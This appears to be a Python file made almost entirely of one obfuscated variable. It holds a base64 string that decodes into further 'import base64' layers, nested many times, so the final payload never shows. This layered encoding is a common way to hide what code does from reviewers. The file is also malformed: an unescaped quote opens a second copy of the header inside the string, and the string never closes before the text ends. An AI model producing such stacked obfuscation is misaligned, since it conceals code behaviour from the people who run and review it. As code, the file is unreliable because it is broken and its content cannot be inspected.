import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3diRFZSYWtwb1ZucEJNbGRzYUc5a01XeFlUbGQwYTFJd1duQlVNalZQWkVac1dWTnFRbWhXZWxaeVYyeGpNVTFGT1hWVmJXaGFZbXMwZDFscVRrSlBWVFZGWTBod2FVMXNiM2RhUldSSFlWZE5lbFZ1V21wU1JFRjNWREkxVDJJeVJsaFhha0pyVFcxNGNscEZaRzVQVlRWRllqQjBTbVZWUmpCVE1tdDNXakZyZVU5WGRHaFdlbFoxVkRKc1EwMVhVa2hYV0ZKUVVUQkdNRk15YTNkVE1HdzFUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzVXpGd2RWTnVXbWxWTUVveVdUQmtWMlJXY0ZsVGJtUk5ZbFJzTmxwSGJFTmpSMHBaVVc1YWFtSnNSbTVYYlRGellrZEtTRlZ1Y0UxUk1Fb3lXWHBPV2xNeGNIVlRibHBwVlRCS2NsZFdhRk5pUjFKSVlraFNZVlV3U25kWmJHaERaRzFPZFZWWFpHRlNNRmwzVjJ4b1UyTkhTbGhXV0U1aFVqQlpkMWRzUm5aaGEzaFVUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSa1ozWVcxS1NGSnVjR3BsVlVvMVYyeG9UMlF4WjNsTlYyaHJVMFZ3ZDFsc1l6VmtWMFpZVDBjNWFWWjZiSEpYYkdRMFpXdDRjazFZV21GU01WcDZVekZTZGxNd2JFUlJWMlJLVW1wc01WZFdZM2hpUld4RlRVZGtTMDB3Y0hOWmVrNURXbTFLV0ZKcVFtcGlWM2d3V1dwSk1XTkhTalZaTUhSS1VUQkdibE5WV1RWaE1YQlpWRzF3YW1KWGVETmFSV1J6WkcxS2NGRlViRXBUUmxad1ZsUkpOV015UmxoVWJrSnJVMFphY2xOVlpGTmlSV3hJVkVWU01XSnJOVFJhUm1SWFlURnNWRkZ0ZEdGVk1Fb3dWMVpvVTJWWFJsaE5XRnBwWWxkNE1sTlZhRXRpUm10NVlrZHNhRll4U205VFYyUjJXakJzUkZGWFpGbE5NSEJ6VjFSRk5XUldiRmhOVjNoS1VrUkNibE5xU1RGa2JVcFlVMjVzWVZVeVRreFRWVTVDV2pCc1NGVnRlR0ZoVlVvMVYyeG9UMlF5U1hsT1YzUmhWMFZ3YlZsNlNUVmpNa1pZVkc1Q2ExTkdXbkpUTUdoUFlrZEtTRmRZVGtwU01EVTFWRVZPUTAxWFJsaFZXRTVLVWpKNGNsa3piRE5hTVd0NVQxaFdhMUl4V1RCYVJWRjRWREpKZVU1WGVFeFdSemxNVTFWT1Fsb3diRVJSVjJSS1VUQktOVmRzWkdwYU1VSlVVVzV3WVZZemFIUlVSekZMWlZkSmVscEljR0ZWTW1oeFdUSnNNMW95VWxoaVIzUk5VVEJLZDFkcmFFNWpNR3hJVkc1YWFXSnNTbk5hVldoU1QxWnJlVTlZVm10U01Wa3dXa1ZPYzFsck1VZE5SWFJLVVRCR2JsTlZUa0phTUd4RVVXMXNhVTFzU1RGVFZWRjNXakJ3TlZrd2RFcFJNRVp1VTFWT1Fsb3diRVJSYld4cFRXeEpNVk5WVG5wUFZXeEVVMjV3YVUxdWFIZFhWRXB6VFVkU1dGVlVXa3RYUlRGNlUxZHNRbUpGYkVSaFNHeGhWakpPTVZsNlNUVmpNa1pZVkc1Q2ExTkdXbkpUTVVaMldqQnNSRkZYWkVwUk1FWnVVMVZrUzJSc2NFbGhNbVJNWldwQ2JsTlhOVk5rYlVwWVQwUmFTMWRGTVhwVFYyeENZa1ZzUkdGSWJHRldNazR4V2tWak5XUkhTalZoTUhSS1VUQkdibE5WVGtKYU1HeEVVVzFzYVUxc1NURlRWVTU2VDFWc1JGTnRNV2xOYm1oM1dXNXdkbUpIVGpWa01teEtVVEZXYmxNd2FFdGlSbkExVGxjeGFVMXVhSGRaYm14eVV6QnNSRkZYWkVwUk1FWnVVMVZPUTJGWFNYbFZhbFpLVVROTk5WTlZUa3RrVjFKWVRWZDRhbUpVWnpKVGJHaE9ZekJzY0ZGWGVFcFJNbWcxVjJ4a2FtUlhTblZXYmxKaFYwVndNbE14Um5aYU1HeEVVVmRrU2xFd1JtNVRWV1JMWkd4d1NXRXlaRXhsYWtKdVUxY3dNV1J0U2xoVGJteGhWa2M1YzFremJETmhWV3hFVmxka1RGTkZjSE5YYm1zeFpGZEplVTFYYkdwaVZsWjNVVEpzUWxvd2JFUlJWMlJLVVRCR2JsZFhNRFZoTWxaVVVWaEtVVlV3Um5CWFZtaERZa2RLU0dWSVFtRlNlbWcwVkRKc1YyVnJlRVJUVjJSTFZUQkdkbGt5TVZkaWEzaDBVbTVrWVZZemFIcFpWbVJUWkdzeFZHRXdkRXBSTUVadVUxVk9RbG93YkVSUmJXeHBUV3hKTVZOVlRucFBWV3hFVTIxb2FsSXhXbnBaYTJSellUSktObE5VV2t0WFJURjZVMWRzUW1KRmJFUmhTR3hoVmpKT01WZFdhRU5pUjBwSVpVaENZVko2YURWVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWa1MyUnNjRWxoTW1STVpXcENibE5YTVdGaVJtdDVZVWRvV1UxcVZtOVhXSEIyWWtkT05XUXliRXBSTVZadVV6Qm9UMDFIVG5CaFNHeGhWakpPTVZkdE1WZGhiVVpJVW0xYWFXSlZXbkZUTVU1eVV6QnNSRkZYWkVwUk1FWnVVMVZPUTJGWFNYbFZhbFpLVVROTk5WTlZUa3RqTWxKWVdrZG9hbUpFYkRGWFZtUk9UbXR3V1ZSWVRrcGhWVVp6VTFWT2IyVldjRmhaTTFacFUwWmFkVmRXYUV0YWJVcDBVbTF3VEZWWE9XNVRWVTVDV2pCc1JGRlhaRXBTTUhBeVYydG9jbG93ZERaTlIyUktZbFp3YzFkVVNtOWhSbWQ1VTIxb2ExZEdSVEpUYkdoT1l6QnNjRkZYZUVwUk1tZzJXa1ZvU21JeVRuUldiVFZOWWxad2MxZFVTbTloUm1kNVUyMW9hMWRHUm5kVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWa1MyUnNjRWxoTW1STVpXcENibE5xUmpSa1ZYQXpZakprU2xFd1JtNVRWVTVDV2pCc1NGZHVXbXBoVlVvMVUxVmtjMlJWYkVsVGJYaGhaVlJXTlZkc1pHdGFiVTUwVm01d2FsSkZXbTFaYkdSSFRVZE9kR0pIV21oV01VbzJWREprZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXMXNhVTFzU1RGVFZVNTZUMVZzUkZOcVFtbE5ha1l5VkRKc1YyVnJlRVJUVjJSTFZUQkdkbE13YUVwa1YxSklUMWhTYVdWWGRIZFJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVoVGJscGhVMGQwYmxNemIzZGFNR3gwVjI1YWFWSXllREpVTW14WFpXdDRSRk5YWkV0Vk1FWjJVekJvU21SV2NIUlBXRTVvVm5wb2QxTXhSblphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdGJHbE5iRWt4VTFWT2VrOVZiRVJUYmxaclZucEdjMWt5TURST2EzQlpWRmhPU21GVlJuTlRWVTV1WWpKT2NFNVlWbXRXZWtaeldUSXdOR05GZEZKaU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdTbkJaYWtwVFRsVnNSR042YkVwUk1IQXpWMVpvUzJWWFNYcFNha1pvVmpCYWJWbFdaRkpPYTNCWlZGaE9TbUZWUm5OVFZVNXVZakpPY0U1WVpGcFhSWEExV1dwT1IwMVhSbGhTYlZwb1ZqRkdNVmx0TURWa1JteDFVMjE0VFZORmJERlpNR1JIWlZkT2RFOVlhR3RXTW5odlYwUktjMkV3ZUhWUmJteHBUVEZ3ZDFsdE1VOWpSbXhVWlVoc1RXSnJTbTlaTWpWTFpHMU9XVlp1UWxwV2FteDNWMnROTVdSSFVsaE9XRUphVFcxNE0xbFdZelJqTWs1d1RsaGtXbGRGY0RWWmFrNUhUVmRHV0ZKdFdtaFdNVVl4VjJ0a2MyUnNhM2xXYm5Cb1YwVXhlbE14VG5KVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRnBpVkd4eVdsWk9RbU5zUWxSUlYyeG9WakpTZWxkc2FFOWpSbXhYVDFoQ1lWSkhPWE5aTTJ3ellWVnNSRlpYWkV4Uk1tZzFWRWN4YzJKdFNraFdibkJvVmpCYWJWbFdaRkprVjBwMFQxaFNXbUpyY0hOVVJVNXlZMFZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VqQndNbGRyYUhKYU1IUTJUVWRrU21KclNtOVpNalZUWTBad1NGSnRXbWxTTW5kM1YyeG9TMkZIU2tWaU1uaHFaVmhrY0ZOVlRsWmFNSFJFWVVoc1RXSnJTbTlaTWpWVFkwWndTRkp0V21sU01uZDNWMnhvUzJGSFNrUmhNMEpFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZXUkxaR3h3U1dFeVpFeGxha0p1VTFjd01XUnRTbGhUYm14aFZrYzVjMWt6YkROaFZXeEVWbGRrVEZFeWFEVlVSekF4WkcxS1dGTnViR0ZWTW5SM1VUSnNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hJVTI1YVlWTkhkRzVUTTI5M1dqQnNkRkp1WkdGV00yaDZXVlprVTJSck1WVmlNbmhxWlZoa2NGTlZUbFphTUhSRVlVaHNUV0pWV2pOWGJHUTBZekpHV0ZWdVdrNVZNblIzVVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeElVMjVhWVZOSGRHNVRNMjkzV2pCc2RGSnVaR0ZXTTJoNldWWmtVMlJyTVhGaU1uaHFaVmhrY0ZOVlRsWmFNSFJFWVVoc1RXSlZXak5YYkdRMFl6SkdXRlZ1V2s1aFYzUjNVVEpzUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4SVUyNWFZVk5IZEc1VE0yOTNXakJzZEZkdGVGcE5iV2h2VjBSSk1XRkdiRFppTW5ocVpWaGtjRk5WVGxaYU1IUkpWR3BDYW1GWGFEVlVSekZoWWtacmVXRkhhRmxOYWxadlYxaHNjbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsSXdjREpYYTJoeVdqQjBOazFIWkVwaVdHZDRWMnBLUjJWV1ozbE9WMmhhWlcwNWMxa3piRE5oVld4RVZsZGtURkV5YURWVVJ6RTBUVlp2ZVZKdWJGbE5hbFp2VjFoc2NtTkZUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xJd2NESlhhMmh5V2pCME5rMUhaRXBpVm5CelYxUktiMkZHWjNsVGJXaHJWMFpGTWxOc2FFNWpNR3h3VVZkNFNsRXlaSFpaTW1zeFlsWndXRlJ0T1ZwV2FteHdWMVpvVjAxRmRGUmhNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WFZ6QTFZVEpXVkZGWVNsRlZNRVp3V1hwS1YwNUhTalppTW5ocVpWaGtjRk5WVGxaYU1IUkVZVWhzVFdKck5YTmFWV00wWTBWMFVtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJLY0ZscVNsTk9WV3hFWTNwc1NsRXdjREZaYWs1VFlVVTVjRlp1Y0UxUk1HeHVVMnhPUW1Jd2RFbFRXRlpwWWxScmQxZFdUbkpqUlU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFNNSEF5VjJ0b2Nsb3dkRFpOUjJSS1ltdEtiVmx0TURWa1JteDFVMjE0VUdGV1dqWlVSVTVLV2pCd1ZGRlhPVXhUUld3eFdUQlpOV1JYU1hsTlYyeHFZbFpXZDFNeFJuWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZ0YkdsTmJFa3hVMVZPZWs5VmJFUlRibVJaVFdwV01sbHNaRXRsVm5CVllqSjRhbVZZWkhCVFZVNVdXakIwUkdGSWJFMWlhMHB0V1cwd05XUkdiSFZUYlhoTVZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGc2RFOVhkR3hWTUVaNVZVWk9RbUZYVGtkUFYyaHFVakZhZWxsclpITmhNa28yVWxSYVMxZEZNWHBUVjJ4Q1lrVnNSRm95T1dwaFZGWXpWMFJLUjJReGNGaGxTRTVvVmpGS01sUldUbkpqUlU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFNNSEF5VjJ0b2Nsb3dkRFpOUjJSS1ltdEtiVmRXYUVOaVIwcElaVWhDWVZKNmFEVlVNbXhYWld0NFJGTlhaRXRWTUVaMlV6Qm9TbVJYVGtkUFYyaHFVakZhZWxsclpITmhNa28yVTFoQ1RGVlhPVzVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJGWFNYbFZhbFpLVVROTk5WTlZUa3RrTVdkNVpVUkdZVTFyV2pWWFJFa3hZVVpzTm1JeWVHcGxXR1J3VTFWT1Zsb3dkRVJoU0d4TlltdEtiVmxyYUZkaWJHeFpVMjFhYVdKVlduRlRNVTV5VXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUmFZbFJzY2xwV1RrSmpiRUpVVVZkc2FWWnFiREZaYWtsNFlWZE9kRlpVV2t0WFJURjZVMWRzUW1KRmJFUmFNamxxWVZSV01GZEVTVEZrYlVwWVUyNXNZVlV5ZEhkUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWhUYmxwaFUwZDBibE16YjNkYU1HeDBUVmRhV2xkRlNuTlphMlEwWTBad1NFOUlhRkJoVmxvMlZFVk9TbG93Y0ZSUlZ6bE1VMFZzTVZsc1dUVmhSMDVJVm01T2FWSXllSEpaYm5CR1kwVjBVbUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCS2NGbHFTbE5PVld4RVkzcHNTbEV3Y0RCWFJFcEhaREZ3V0dWSVRtaFdNVW95VkZkd2RtSkhUalZrTW14S1VURldibE13VG05bFZYaDBUVmRhV2xkRlNuTlphMlEwWTBad1NFOUliRXhWTW5STVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNV3gwVDFkMGJGVXdSbmxWUms1Q1lWZEtWMDlZVG10V01sSnZXVEozTldSV2JGaFVWRnBMVjBVeGVsTlhiRUppUld4RVdqSTVhbUZVVmpCWFJFbzBUVlp2ZVZKdWJGbE5hbFp2VjFoc2NtTkZUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xJd2NESlhhMmh5V2pCME5rMUhaRXBpYTBwdFdUQlpOV1JYU1hsTlYyeHFZbFpWTWxOc2FFNWpNR3h3VVZkNFNsRXlaSFpaTW1zeFpERm5lbEZ0V21saVZHd3dWMWMxUzJKRmRGUmhNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WFZ6QTFZVEpXVkZGWVNsRlZNRVp3V1d4Wk5XUXhaM2xPV0ZwcFZqQndOVmRzVW5aaVIwNDFaREpzU2xFeFZtNVRNRTV2WlZWNGRFMVhXbXBTYW13eFdXcEplR0ZYVG5SV1dFSk1WVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFlWZEplVlZxVmtwUk0wMDFVMVZPUzJReFozbE5WMXBwWWxSc01GZFhOVXRpUlRsd1ZtNXdUVkV3Ykc1VGJFNUNZakIwU1ZOWVZtcFNhbXd3VjBSSk1XUnRTbGhUYm14aFZUSjBkMUV5YkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1NGTnVXbUZUUjNSdVV6TnZkMW93YkhSTlYxcHBWbXBzTVZscVNYaGhWMDUwVmxSYVMxZEZNWHBUVjJ4Q1lrVnNSRm95T1dwaFZGWXdWMFJKZUZwdFNuUlBXRkphWW10d2MxTXhUbkpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpGcGlWR3h5V2xaT1FtTnNRbFJSVjJ4cFZqQmFjbGt5TVhOa1ZteFZZako0YW1WWVpIQlRWVTVXV2pCMFJHRkliRTFpVkVadlYydG9TMk5IU25SU1dFSk1WVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFlWZEplVlZxVmtwUk0wMDFVMVZPUzJReGJGaFZibXhvVm5wV01sUXliRmRsYTNoRVUxZGtTMVV3Um5aVE1HaEtaRmRPU0ZKdGRHcGlWM2d4V1c1c2NtTkZUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xJd2NESlhhMmh5V2pCME5rMUhaRXBpVkVaM1dXMHhjMlZ0VWtsVGJscFFZVlphTmxSRlRrcGFNSEJVVVZjNVRGTkZiREZaYkdSelpGZEdXVlJxUW1waVZHZ3hXVzB3TldSR2JIVlRiWGhOVTBWc01WbHNaSE5rVjBaWlZHcENhbUpVYURGWFZtaERZa2RLU0dWSVFtRlNlbWcwVkVWb1NtUlhTbGhpU0Zab1YwVTBkMWt5TURSa1ZteFpVVzE0YVZJemFIZFhhMk0wWlZWNFNWTllWbWxXTW5neFdWWm9UMDFIVG5SUFNGWmhZbFphY1ZsVlpFZGFiVXAwVW0xd1RWTkZiREZaYkdSelpGZEdXVlJxUW1waVZHZ3hXV3RvVjJKc2JGbFRiVnBwWWxWYWNWUkZhRXBrVjBwWVlraFdhRmRGTkhkWk1qQTBaRmRKZWxOdGRHRldlbFp0V1Zaa1VtUlhTblJQV0ZKYVltdHdjMVJGVG5KalJVNXdVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBTTUhBeVYydG9jbG93ZERaTlIyUktZbFJHZDFsdE1YTmxiVkpKVTI1YVdVMHdOSGhaTUdRMFlrVTVjRlp1Y0UxUk1HeHVVMnhPUW1Jd2RFbFRXRlpwVmpKNE1WbFdhRTlOUjA1MFQxZGFhazB4V2pOWmEyUldaRmRLZEU5WVVscGlhM0J6VkVWb1NtUlhTbGhpU0Zab1YwVTBkMWt5TURWYWJVMTZWbTVrYVZJeFZqRlhWbWhEWWtkS1NHVklRbUZTZW1nMFZFVm9TbVJYU2xoaVNGWm9WMFUwZDFreU1EVmFiVTE2Vm01a2FWSXhWakZYVm1oRFlrZEtTR1ZJUW1GU2VtZzFWRVZvU21SWFNsaGlTRlpvVjBVMGQxa3lNRFZhYlUxNlZtNWthVkl4VmpGWGJURlhZVzFHU0ZKdFdtbGlWVnB4VkVWb1NtUlhTbGhpU0Zab1YwVTBkMWt5TURWYWJVMTZWbTVrYVZJeFZqRlphMmhYWW14c1dWTnRXbWxpVlZweFZFVm9TbVJYU2xoaVNGWm9WMFUwZDFreU1EVmFiVTE2Vm01a2FWSXhWakZaYWs1TFlURndXRTVYV21oV01VWXhXVzB3TldSR2JIVlRiWGhOVVRKMGQxRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzU0ZOdVdtRlRSM1J1VXpOdmQxb3diSFJsU0VKclVqRmFOVmRXWkRSYWJWSklWbXBTYTFKSE9YTlpNMnd6WVZWc1JGWlhaRXhSTW1nMVZFY3hOR05IVWtoV2JteGFWak5vYlZwRlpGZE9SMUpFWVROQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZrUzJSc2NFbGhNbVJNWldwQ2JsTlhNSGhpUjAxNlZXNUNiR0pVWnpKVGJHaE9ZekJzY0ZGWGVFcFJNbVIyV1RKck1XUkdjRmxVYWtKb1YwaENNbFJITURGa2JVcFlVMjVzWVZVeWRIZFRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93VG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsSXdjREpYYTJoeVdqQjBOazFIWkV0TldHZ3hVMjVrZGxvd2JFUlJWMlJLVVRCR2JsTlZZM2hoUjBaWVpVZGFhVTFyY0hoVFZWRjNXakpOZVZadVRtRmhWRll6V1dwSk5XTXdlSFJhUjNoclVUSmtkVmxzWkVkalIwcEVUbGhTWVZkRk5UWlhWbVJyWWtWd05XRXdkRXBSTUVadVUxVk9RbG93YkVSUmJscHFVakExYlZkVVNUVmtWbkJ6VDFoYVdtSlhPVzVWUms1RFpXeHdXR1ZITVUxaWEwb3lXV3BLTTJSV2IzbFdha0pNVVRKU01sa3daRTlqUjBsNVRsZDRhazFVYkhGWmFra3hZbFZ3TldFd2RFcFJNRVp1VTFWT1Fsb3diRVJSYlhCcFRUQndOVmRzV1RWaGJVbDVUbGN4V1UxcWJIQlpWMnhDVDFWc1NWUnRlR2xTTVd3eFdUQmpOV1J0U2tST1Z6VmhWMFpHZGxOcVRrOWhSbXQ2VTIxb1dVMXJOVEpaTWpWTFlrZEplRTlYY0dsTmFsWjBXVlprYW1KcmRGSmlNbVJLVVRCR2JsTlZUa0phTUd4SVQxaGtXazFVYkhGWmFra3hZbFpuZVdKSGRHcGxWVVUxVTFWak5XUXhhM2hQVjNCcFRXcFdkRmRFU1RWaFYwWndUbGh3WVZZd1dqVlhWRXB1WWpGcmVsTllUa3BUUmxwM1YydE9NMW94WTNoTlNFNUtVakExTWxsdE5WTmlSMVpKVlZSc1drMXFiREZhUldSWFRrZFNSR0V3ZEVwUk1FWnVVMVZPUWxvd2JFUlJibHBxVWpBMWJWZFVTVFZrVm5Cd1VWUnNTbEo2YkROWFZFVTFZVzFKZVU1WE1WbE5hbXh3V1Zkck1XRlhUblJQVkU1cVRXeFdkbGRVVGtwak1HeEpWbTVDWVZFemFESlpNR1JQV214cmVVOVlWbUZpUkd4M1YydG9UbU14YTNsUFdGWnJVakZaTUZwRlVYaGhiVWw1VGxSQ1lWZEhaM2RUTVZwNlpERm9WRkZ1UW1GaFZVb3lXVEJrVDFwc2EzbFBXRlpoWWtSc2QxZHJhRTVhTVhCWVpVaHdZVlV3U2xCWmFra3hZa1ZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3dUbkJSVjJSS1VUQkdibE5WVGtKYU1XdDVUMWhzYW1KV1dqSlhSRXB6WVRKT05WRlViRXBTTURVeVdUSTFTMkpHWjNsVWJscHBZbFp3YlZscVNrdGpWWGgxVkcxNFdsZEZjSEZaVlU1dllXMU9jR1F5Wkd0V01uaHlWRVZPUTFscmNEVlhWelZOVVRKa2RWa3lNVmRsYlU1SVQxaFdZVkl4V20xWmVrazFZekpHV0ZSWE5VMVJNazAxVTI1c05GWlhUblZXYlhoTVZUTmtkbE5xU2s5a2JVNTFVMjE0YVdWWFRucFRibTkzWW10NFNWTnRlR0ZsVkZaeFdXcE9TMlZXY0ZoUFYxcGFUV3BzTVZkdE1YTmliR2Q1WWtkMFRXSlZOVEpaTWpWTFlrZEtOV0pIVWsxUk1FcHhXV3BKTVUxR2NGbGhSRUpSVmpBMU1sbHROVk5pUjFaSlZWaENSR0ZWUm01VFZVNUNXakJzUkZGWFpHRldla1p2V1Zaa05GcHRVa2hQUjJSUlZUQkdkVk51WkhaYU1HeEVVVmRrU2xFd1JtNVRWV1J6WWxWc1NGUnVXbXBpYTNCeldXcEZOV05HY0VsVVZGcEVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVldSWFpFWnNXR0pJVGxsTk1Vb3lVMVZSZDFveVRuUldiVFZOWWxVMU1sa3lOVXRpUjBsNFQxZHdhVTFxVm5SWlZtUnJXbTFHV0ZWWVZscE5hbXcxV1RJeFYyUnJUbkJSVjJSS1VUQkdibE5WVGtKYU1rcFpWRzAxV1UweGNHOVphMmhPV2pGQ1ZGRnFaRVJoVlVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRtdGxiVkpZVTI1R1lWWXdOSGRUYm5CMldqSlNWRnBHVG1GWFJUVXpXa1prVjJWdFVraFNWMlJhWW14YU5sa3hhRmRpUm5CSVVsZGtZVkl4Vm01WmJHUkhUVWRPZEdKSVVtbE5hbFozV1c1c1FtSXdjRFZrU0hCclUwVnNkbGt5TVZkaWEzaDFWRzVhYVZJeWVIRlpWbWhUVFZad1JHRXpTa3RsVjNSMVZFVkdkbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZjMVlWSXdXWGRYYkU1cVRtdHNTRlZ0YUd0U01WbDNXVlpqZUdKRmVIUk9XRnByWlZka2QxUkhOVTlOUjA1MFYycENhRlo2Um5OVE1FNXFZa1prVkUxSGVHbFZla0p6VjJ0T2FtTkZlRUppTW1SS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JuVmFSbWhQWWtkT2MwOVlRbUZSTWsweVUxVm9WMk5HY0VSa01IUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUYWtsNFpHeHdTRlp1VGt0bGJUbHVVMnBPUzJKSFRYcFJiVnBwVmpCWmQxa3lNWE5rUjBsNVRsaENhV1ZYVG5wUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJhU0d4aFYwVTFiVmxXWkZKaWF6bHdVVzVzWVZZeVRucFJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSYVIyeHBUV3hKTVZkRVRsTmlSMVpKVlZjMVVHRlZTbkJaYWtwVFRsVjRRbUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2RWZHNZM2hoUjBaWVpVZGFZV0pyY0RKWmJFNXFUbXRzU0U5WVpGcE5WR3h4V1dwSk1XSlZlSFJVYmxwcVltdHdjMWxxUlRWbFZuQllUVmhDYTFFd1NuZFhiV3hEWkcxT1NGUnRXbHBOYW13eFYyMXNRMkpIU2tsVWJYaEtVVEpPZFZSRlJuWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYTldGV2VrWnZXVlprTkZwdFVraFBSelZRWVZWS2MxbHNaRWRqUjBwSFQxUkNhV1ZZWkV4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diM2xXYmxKYVZqSjRlbGRFU2s5aGEzQTJZakprUzJWWFRucFJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSYVIzaHBWakJhZDFscldUVmhWbXQ1VkZjMVVHRlhUblZVUlVaMldqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWelZxWWxaYU0xbHJhSE5hYlZKSVQwYzFVR0ZWUm5WVGJtd3pVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSTFRXcEdjMWw2VGs5aFJtOTVWbTFhYUZZeFJuVlVNbXhEVkRKSmVVNVhlRTFSVnpsdVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmliVTUwVm0weFlWZEZjSE5aYlRGUFlrZE9OVmw2V2twU1ZGWXlXVzB4Vm1Nd1RuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV5VWpaYVJtUkxUVWRXV1ZGdGVFdGxiVGx1VTJwT1EyTXhiRmhpU0ZaTFpWaGtURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCdmVXRkhlRnBXTVVweldUSTFUbUpyT1hCUmF6bHBUV3BXYzFSRlJuWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYTldsV01GcDNXV3RaTldWc2NGbFRha3BoVjBWd2JWbFdaRkppYXpsd1VXczVhVTFxVm5OVVJVWjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVnpWcVRURktiMXBGWkZaaWF6bHdVVmMxYVUweFdYZFhha2sxWTBkS2RGa3lOVTFSVnpsdVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmliR3haVm1wQ2FVMVViSEpYYkdRMFlrZFNTRlpYTlZCaFZVcElWMVprTkdWc2NGSmlNbVJLVVRCR2JsTlZUa0phTUd4SlRVVjBTbEV3Um01VFZVNUNXakJzUkZGdVVscFdNbmg2VjBSS2MyRXdiRVZOUjJScFZqQmFkMWxyV1RWa2JHeDBZak5XV2swd2NITlhWbWhUWWtWMFNGUnViRTFSTUVsNFdWWmtVbU13YkVoTldIQmhUVlJyZVZkV1pEUmxhM2hFVVcxd2FVMXFWWGRYYkdodlRVVjBVbUl5WkVwUk1FWnVVMVZPUWxvd2JFbFRiWGhxVFRCR2JsVkdUa05rUm14WVlraE9XVTFxYkhCWlYyc3haV3h3V0U1WGRFeFNNRFUxVkVWT1EwMVhSbGhWV0U1S1VtNVNNRmRXWkhOak1XZDVZa2QwV1ZVelpHNVdhMmhMVFZad1ZHVkhjR2xOYWxWM1YyeG9iMDFGZEZSUlYyUktVVEJHYmxOVlRrSmFNRTV3VVZka1NsRXdSbTVUVlU1Q1dqSk9kRlpxUW10WFJYQXhVMVZvVDJKSFNraFhXRlpyVFRCd2Qx